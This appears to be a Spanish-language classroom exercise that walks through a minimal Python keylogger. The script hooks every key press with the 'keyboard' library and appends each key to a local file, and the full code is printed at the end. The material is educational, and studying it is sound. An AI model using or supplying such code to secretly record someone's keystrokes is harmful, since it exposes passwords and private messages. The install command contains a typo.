# SI_T5_P1
import keyboard

El impor keyboard es para añadir la libreria de keyboard la cual hemos instalado previamente con el sigueitne comando:

pip install keyboar.

Luego creamos una función a la que llamaremos imprime\_tecla, y añadimos una variable llamada tecla.

def imprime\_tecla(tecla):

Cada vez que se pulse una tecla pondra su nombre, por ejemplo si presionamos la a sladra 'a' si presionamos la tecla espacio saldra 'space'.

print(tecla.name)

Para guardar todas las teclas presionadas pondremos la siguiente linea

 Abrir el archivo en modo 'a' para agregar el texto al final

with open('texto.txt', 'a') as file:

abre el archivo texto.txt y la 'a' es para que cada vez que se añade un texto no borre lo que ya haya


if tecla.name == 'space':

Lo que nos permite hacer esto es que si la tecla pulsada es el espacio  en vez de poner 'space' deje un espacio

file.write(' ')

else:

sino que ponga el nombre de la tecla

file.write(tecla.name)


keyboard.on\_press(imprime\_tecla)

Este comando nos permite que la funcion quede registrada cada vez que se pulse una tecla.

Nos manitene el programa abierto esperandoa a la entrada del teclado

keyboard.wait()

El codigo sin comentarios quedaría así:

import keyboard

def imprime\_tecla(tecla):

print(tecla.name)

with open('texto.txt', 'a') as file:

if tecla.name == 'space':

file.write(' ')

else:

file.write(tecla.name)

keyboard.on\_press(imprime\_tecla)

keyboard.wait()
